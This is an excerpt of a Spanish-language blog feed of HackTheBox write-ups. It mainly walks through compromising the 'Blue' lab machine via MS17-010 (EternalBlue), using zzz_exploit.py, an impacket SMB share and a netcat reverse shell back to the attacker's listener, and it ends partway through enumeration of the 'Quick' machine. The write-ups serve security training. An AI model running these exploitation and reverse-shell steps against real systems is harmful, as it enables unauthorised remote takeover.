PING 10.10.10.40 (10.10.10.40) 56(84) bytes of data.
64 bytes from 10.10.10.40: icmp_seq=1 ttl=127 time=146 ms

--- 10.10.10.40 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 146.307/146.307/146.307/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt; correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;ESCANEO DE PUERTOS&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 02:52 GMT
Initiating SYN Stealth Scan at 02:52
Scanning 10.10.10.40 [65535 ports]
Discovered open port 445/tcp on 10.10.10.40
Discovered open port 139/tcp on 10.10.10.40
Discovered open port 135/tcp on 10.10.10.40
Discovered open port 49153/tcp on 10.10.10.40
Discovered open port 49152/tcp on 10.10.10.40
Discovered open port 49156/tcp on 10.10.10.40
Discovered open port 49155/tcp on 10.10.10.40
Discovered open port 49154/tcp on 10.10.10.40
Discovered open port 49157/tcp on 10.10.10.40
Completed SYN Stealth Scan at 02:52, 20.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.40
Host is up, received user-set (0.22s latency).
Scanned at 2023-06-18 02:52:13 GMT for 20s
Not shown: 65193 closed tcp ports (reset), 333 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
49152/tcp open  unknown      syn-ack ttl 127
49153/tcp open  unknown      syn-ack ttl 127
49154/tcp open  unknown      syn-ack ttl 127
49155/tcp open  unknown      syn-ack ttl 127
49156/tcp open  unknown      syn-ack ttl 127
49157/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 20.51 seconds
           Raw packets sent: 99432 (4.375MB) | Rcvd: 83167 (3.327MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;ESCANEO DE VERSION Y SERVICIOS.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p135,139,445,49152,49153,49154,49155,49156,49157 10.10.10.40 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 03:00 GMT
Nmap scan report for 10.10.10.40
Host is up (0.31s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-18T03:01:39
|_  start_date: 2023-06-18T02:43:00
| smb2-security-mode: 
|   2.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-06-18T04:01:42+01:00
|_clock-skew: mean: -19m57s, deviation: 34m36s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 79.42 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos información interesante de los puertos escaneados y que el equipo corresponde a una maquina &lt;code&gt;Windows 7&lt;/code&gt;:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;135&lt;/td&gt;
      &lt;td&gt;RPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;139&lt;/td&gt;
      &lt;td&gt;LDAP&lt;/td&gt;
      &lt;td&gt;Microsoft Windows netbios-ssn&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;445&lt;/td&gt;
      &lt;td&gt;SMB&lt;/td&gt;
      &lt;td&gt;Windows 7 Professional 7601 Service Pack 1 microsoft&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;49152-49157&lt;/td&gt;
      &lt;td&gt;MSRPC&lt;/td&gt;
      &lt;td&gt;Microsoft Windows RPC&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;EXPLOTACION &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Vamos a comenzar utilizando los scripts internos de nmap &lt;code&gt;vuln and safe&lt;/code&gt;, para activar el escaneo de vulnerabilidades de forma segura.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ nmap --script &quot;vuln and safe&quot; -p445 10.10.10.40 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-18 03:07 GMT
Nmap scan report for 10.10.10.40
Host is up (0.13s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 4.50 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;El escaneo nos reporta que el servicio es vulnerable a &lt;code&gt;MS17-010&lt;/code&gt; que corresponde a una ejecución remota de comandos.&lt;/p&gt;

&lt;p&gt;Para explotar esta vulnerabilidad vamos a usar un &lt;code&gt;exploit&lt;/code&gt; del repositorio de github de worawit:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/worawit/MS17-010&quot;&gt;https://github.com/worawit/MS17-010&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Vamos a clonar el repositorio y dentro observaremos varios scripts en &lt;code&gt;python&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ git clone https://github.com/worawit/MS17-010
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 476.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
❯ cd MS17-010
❯ ls
 shellcode    eternalblue_exploit7.py   eternalchampion_leak.py   eternalromance_leak.py   eternalsynergy_leak.py   mysmb.py         zzz_exploit.py
 BUG.txt      eternalblue_exploit8.py   eternalchampion_poc.py    eternalromance_poc.py    eternalsynergy_poc.py    npp_control.py  
 checker.py   eternalblue_poc.py        eternalchampion_poc2.py   eternalromance_poc2.py   infoleak_uninit.py       README.md
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos el &lt;code&gt;checker.py&lt;/code&gt; para poder enumerar los &lt;code&gt;namedpipes&lt;/code&gt; vulnerables.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Named Pipe: Una named pipe es un canal de comunicaciones half-duplex o full-duplex entre un servidor pipe y uno o más clientes. Todas las instancias de una named pipe comparten el mismo nombre, pero cada instancia tiene sus propios búfers y handles y tienen conductos separados para la comunicación cliente-servidor.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_ACCESS_DENIED
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: STATUS_ACCESS_DENIED
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al ejecutarlo vemos que no nos reporta un &lt;code&gt;named pipe&lt;/code&gt; vulnerable, asi que vamos a abrir el &lt;code&gt;checker.py&lt;/code&gt; y vamos a ingresar en las credenciales de invitado &lt;code&gt;guest&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blue/blue1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 checker.py 10.10.10.40
Target OS: Windows 7 Professional 7601 Service Pack 1
The target is not patched

=== Testing named pipes ===
spoolss: STATUS_OBJECT_NAME_NOT_FOUND
samr: Ok (64 bit)
netlogon: Ok (Bind context 1 rejected: provider_rejection; abstract_syntax_not_supported (this usually means the interface isn't listening on the given endpoint))
lsarpc: Ok (64 bit)
browser: Ok (64 bit)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Esta vez si nos reporta &lt;code&gt;named pipes&lt;/code&gt; vulnerables, lo siguiente ahora es usar uno de estos en conjunto con el script &lt;code&gt;zzz_exploit.py&lt;/code&gt; donde tambien asignaremos el usuario &lt;code&gt;guest&lt;/code&gt; al igual que en el &lt;code&gt;checker.py&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blue/blue3.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py
zzz_exploit.py &amp;lt;ip&amp;gt; [pipe_name]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Dentro de &lt;code&gt;zzz_exploit.py&lt;/code&gt;, vamos a introducior el codigo que queremos ejecutar en la maquina victima. El cual nos entablara una conexión a nuestra maquina usando el &lt;code&gt;nc.exe&lt;/code&gt; que ofreceremos mediante un recurso compartido en nuestra maquina.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Blue/blue2.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para ello primero vamos a descargarnos el ejecutable de &lt;code&gt;nc.exe&lt;/code&gt; de:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://eternallybored.org/misc/netcat/&quot;&gt;https://eternallybored.org/misc/netcat/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Concretamente el &lt;code&gt;netcat 1.12&lt;/code&gt;, lo descomprimimos y usaremos el &lt;code&gt;nc64.exe&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ unzip netcat-win32-1.12.zip -d netcat
Archive:  netcat-win32-1.12.zip
  inflating: netcat/doexec.c         
  inflating: netcat/getopt.c         
  inflating: netcat/netcat.c         
  inflating: netcat/generic.h        
  inflating: netcat/getopt.h         
  inflating: netcat/hobbit.txt       
  inflating: netcat/license.txt      
  inflating: netcat/readme.txt       
  inflating: netcat/Makefile         
  inflating: netcat/nc.exe           
  inflating: netcat/nc64.exe         
❯ cd netcat
❯ ls
 doexec.c   generic.h   getopt.c   getopt.h   hobbit.txt   license.txt   Makefile   nc.exe   nc64.exe   netcat.c   readme.txt
❯ rm nc.exe
❯ mv nc64.exe nc.exe
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora ofrecemos un recurso compartido con el nombre de &lt;code&gt;smbFolder&lt;/code&gt; y nos ponemos en escucha en el puerto &lt;code&gt;443&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ejecutamos en &lt;code&gt;zzz_exploit.py&lt;/code&gt; en conjunto con uno de los &lt;code&gt;named pipes&lt;/code&gt; validos, es posible que el exploit deba ejecutarse varias veces.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ python2 zzz_exploit.py 10.10.10.40 samr
Target OS: Windows 7 Professional 7601 Service Pack 1
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081e5088
InParam: 0xfffff8a00818a15c
MID: 0x803
unexpected alignment, diff: 0x5a088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081df088
InParam: 0xfffff8a003aa715c
MID: 0x803
unexpected alignment, diff: 0x4737088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a0081f8088
InParam: 0xfffff8a0081f115c
MID: 0x803
unexpected alignment, diff: 0x6088
leak failed... try again
CONNECTION: 0xfffffa800328a7c0
SESSION: 0xfffff8a008eed2e0
FLINK: 0xfffff8a008210088
InParam: 0xfffff8a00820a15c
MID: 0x903
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
creating file c:\pwned.txt on the target
Opening SVCManager on 10.10.10.40.....
Creating service ijHA.....
Starting service ijHA.....
The NETBIOS connection with the remote host timed out.
Removing service ijHA.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Despues de unos segundos se realiza la petición a nuestro recurso compartido.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.40,49158)
[*] AUTHENTICATE_MESSAGE (\,HARIS-PC)
[*] User HARIS-PC\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[*] Connecting Share(1:IPC$)
[*] Connecting Share(2:smbFolder)
[-] Unknown level for query path info! 0xf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;y recibimos la conexión directamente como el usuario &lt;code&gt;nt authority\system&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;❯ ncat -nlvp 443
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.40.
Ncat: Connection from 10.10.10.40:49159.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&amp;gt;whoami
whoami
nt authority\system
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;escalada-de-privilegios&quot;&gt;ELEVACION DE PRIVILEGIOS &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Buscamos de forma recursiva y visualizamos la primera flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Users&amp;gt;cd C:\Users\haris\Desktop
cd C:\Users\haris\Desktop

C:\Users\haris\Desktop&amp;gt;type user.txt
type user.txt
33a8d822f06436dc6144f0a0bbe9a6eb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finalmente nos dirigimos al directorio del usuario Administrador y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;C:\Users&amp;gt;cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop&amp;gt;type root.txt
type root.txt
efa091a0be11892c7056beb574c5bd87
&lt;/code&gt;&lt;/pre&gt;

</description>
        <pubDate>Sat, 17 Jun 2023 00:00:00 +0000</pubDate>
        <link>http://localhost:4000/hackthebox/htb-writeup-Blue</link>
        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Blue</guid>
        
        <category>Smb Enumeration</category>
        
        <category>MS17-010</category>
        
        <category>Eternalblue</category>
        
        
        <category>hackthebox</category>
        
      </item>
    
      <item>
        <title>Maquina Quick - htb writeup</title>
        <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo &lt;code&gt;Quick&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; una maquina potente &lt;code&gt;linux&lt;/code&gt; de dificultad hard, donde vamos a estar obtener informacion a traves del &lt;code&gt;http3&lt;/code&gt; compilando una version de &lt;code&gt;curl&lt;/code&gt;, con la información obtenida vamos a computar correos para mediante fuerza bruta ganar acceso a un pandel de tickets donde explotaremos una vulnerabilidad en &lt;code&gt;esigate&lt;/code&gt; que nos permitira realizar &lt;code&gt;RCE&lt;/code&gt; para ganar acceso al sistema. En la parte de elevación de privilegios nos aprovecharemos de la mala configuración de una impresora, para secuestrar el contenido que imprime y modificarlo para obtener información y migrar a otro usuario y ya como este podremos leer el contenido de un archivo de configuración que nos dara las credenciales del usuario &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Es una maquina bastante entretenida asi que a darle!.&lt;/p&gt;

&lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ mkdir Quick
❯ ls
 Quick
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Seguidamente con la funcion mkt crearemos nuestros directorios de trabajo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ which mkt
mkt () {
	mkdir {nmap,content,exploits,scripts}
}
❯ mkt
❯ ls
 content   exploits   nmap   scripts
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;enumeracion&quot;&gt;Enumeración &lt;a href=&quot;#enumeracion&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Comenzaremos con la fase de Enumeracion, mandando una traza a la ip de la maquina victima con el comando &lt;code&gt;ping&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ ping -c 1 10.10.10.186
PING 10.10.10.186 (10.10.10.186) 56(84) bytes of data.
64 bytes from 10.10.10.186: icmp_seq=1 ttl=63 time=118 ms

--- 10.10.10.186 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 117.913/117.913/117.913/0.000 ms
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Vemos que la maquina nos responde, con un ttl de &lt;code&gt;127&lt;/code&gt;correspondiente a una maquina &lt;code&gt;windows&lt;/code&gt;, ahora procederemos a el escaneo de puertos con la ayuda de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;h3 id=&quot;escaneo-de-puertos&quot;&gt;Escaneo de Puertos&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Parámetro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripción&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-p-&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escaneamos todos los 65535 puertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;–open&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que estén abiertos.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-v&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando (verbose).&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;a href=&quot;#enumeracion&quot;&gt;-oG&lt;/a&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para que mediante una funcion de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre &lt;code&gt;openPorts&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.186 -oG openPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:46 GMT
Initiating SYN Stealth Scan at 21:46
Scanning 10.10.10.186 [65535 ports]
Discovered open port 22/tcp on 10.10.10.186
Discovered open port 9001/tcp on 10.10.10.186
Completed SYN Stealth Scan at 21:47, 17.10s elapsed (65535 total ports)
Nmap scan report for 10.10.10.186
Host is up, received user-set (0.14s latency).
Scanned at 2023-06-16 21:46:51 GMT for 17s
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
9001/tcp open  tor-orport syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 17.28 seconds
           Raw packets sent: 83322 (3.666MB) | Rcvd: 83310 (3.332MB)
&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&quot;escaneo-de-version-y-servicios&quot;&gt;Escaneo de Version y Servicios.&lt;/h3&gt;

&lt;pre&gt;&lt;code class=&quot;language-java&quot;&gt;❯ nmap -sCV -p22,9001 10.10.10.186 -oN targeted
Starting Nmap 7.92 ( https://nmap.org ) at 2023-06-16 21:48 GMT
Nmap scan report for 10.10.10.186
Host is up (0.20s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 fb:b0:61:82:39:50:4b:21:a8:62:98:4c:9c:38:82:70 (RSA)
|   256 ee:bb:4b:72:63:17:10:ee:08:ff:e5:86:71:fe:8f:80 (ECDSA)
|_  256 80:a6:c2:73:41:f0:35:4e:5f:61:a7:6a:50:ea:b8:2e (ED25519)
9001/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Quick | Broadband Services
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.12 seconds
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Visulizamos informacion interesante de los puertos escaneados:&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Puerto&lt;/th&gt;
      &lt;th&gt;Servicio&lt;/th&gt;
      &lt;th&gt;Versión&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;21&lt;/td&gt;
      &lt;td&gt;SSH&lt;/td&gt;
      &lt;td&gt;OpenSSH 7.6p1&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;9001&lt;/td&gt;
      &lt;td&gt;HTTP&lt;/td&gt;
      &lt;td&gt;Apache httpd 2.4.29&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;explotación&quot;&gt;Explotación &lt;a href=&quot;#explotación&quot;&gt;#&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Utilizaremos &lt;code&gt;whatweb&lt;/code&gt; para identificar las tecnoligias que emplea el servicio web de la maquina en el puerto &lt;code&gt;9001&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ whatweb http://10.10.10.186:9001
http://10.10.10.186:9001 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.10.186], Script, Title[Quick | Broadband Services], Via-Proxy[1.1 localhost (Apache-HttpClient/4.5.2 (cache))], X-Powered-By[Esigate]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que el servicio corresponde a un &lt;code&gt;Esigate&lt;/code&gt;.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Esigate: ESIGate permite una integración transparente y eficiente entre todas las aplicaciones Web. Por ejemplo, agregue a un CMS (Sistema de gestión de contenidos) módulos desarrollados en cualquier lenguaje (PHP, Java, . Net…) sin problemas de caché o de accesibilidad.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Abrimos el servicio en el navegador y vemos un mensaje &lt;code&gt;update&lt;/code&gt;, donde nos comenta que se esta utilizando la ultima versión de &lt;code&gt;http&lt;/code&gt;, que corresponde a &lt;code&gt;http3&lt;/code&gt;, ademas tambien podemos ver una lista de usuarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/HTB/htb-writeup-Quick/quick1.PNG&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

